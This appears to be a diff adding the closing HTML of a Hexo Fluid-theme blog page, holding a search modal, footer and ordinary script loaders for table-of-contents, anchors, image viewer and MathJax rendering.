+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+  <script>
+  Fluid.utils.createScript('https://lib.baomitu.com/mermaid/8.14.0/mermaid.min.js', function() {
+    mermaid.initialize({"theme":"default"});
+
+    Fluid.utils.listenDOMLoaded(function() {
+      Fluid.events.registerRefreshCallback(function() {
+        if ('mermaid' in window) {
+          mermaid.init();
+        }
+      });
+    });
+  });
+</script>
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Grep</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    function isExpandAllEnabled() {
+      return CONFIG.toc && CONFIG.toc.expand_all === true;
+    }
+    function expandAllToc() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .tocbot-is-collapsed').removeClass('tocbot-is-collapsed');
+    }
+    function updateTocToggle($li, $childList) {
+      var $toggle = $li.children('.toc-toggle');
+      if ($toggle.length === 0) { return; }
+      var collapsed = $childList.hasClass('tocbot-is-collapsed');
+      $toggle
+        .toggleClass('toc-toggle-collapsed', collapsed)
+        .toggleClass('toc-toggle-expanded', !collapsed);
+    }
+    function bindTocToggle() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .toc-list-item').each(function() {
+        var $li = jQuery(this);
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) {
+          if ($li.children('.toc-toggle').length === 0) {
+            $li.prepend('<span class="toc-toggle toc-toggle-placeholder" aria-hidden="true">›</span>');
+          }
+          return;
+        }
+
+        if ($li.children('.toc-toggle').length === 0) {
+          $li.prepend('<span class="toc-toggle toc-toggle-expanded" aria-hidden="true">›</span>');
+        }
+        updateTocToggle($li, $childList);
+      });
+      jQuery('#toc-body').off('click.tocToggle').on('click.tocToggle', '.toc-toggle', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        var $li = jQuery(this).parent('.toc-list-item');
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) { return; }
+        $childList.toggleClass('tocbot-is-collapsed');
+        updateTocToggle($li, $childList);
+      });
+      if (!window.__tocToggleObserver) {
+        window.__tocToggleObserver = new MutationObserver(function(mutations) {
+          mutations.forEach(function(mutation) {
+            if (mutation.type !== 'attributes' || mutation.attributeName !== 'class') { return; }
+            var $list = jQuery(mutation.target);
+            var $li = $list.parent('.toc-list-item');
+            if ($li.length === 0) { return; }
+            updateTocToggle($li, $list);
+          });
+        });
+        jQuery('#toc-body ol').each(function() {
+          window.__tocToggleObserver.observe(this, { attributes: true });
+        });
+      }
+    }
+    var tocConfig = Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc);
+    if (isExpandAllEnabled()) {
+      tocConfig.collapseDepth = 6;
+    }
+    window.tocbot.init(tocConfig);
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+    expandAllToc();
+    bindTocToggle();
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+        expandAllToc();
+        bindTocToggle();
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
+                    }
+                  });
+                }, '', false]
+              }
+            }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
+        }
+
+        Fluid.events.registerRefreshCallback(function() {
+          if ('MathJax' in window && MathJax.startup.document && typeof MathJax.startup.document.state === 'function') {
+            MathJax.startup.document.state(0);
+            MathJax.texReset();
+            MathJax.typeset();
+            MathJax.typesetPromise();
+          }
+        });
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.2/es5/tex-mml-chtml.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/star.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Please enable JavaScript to render the matrix.</div>
+  </noscript>
+</body>
+</html>
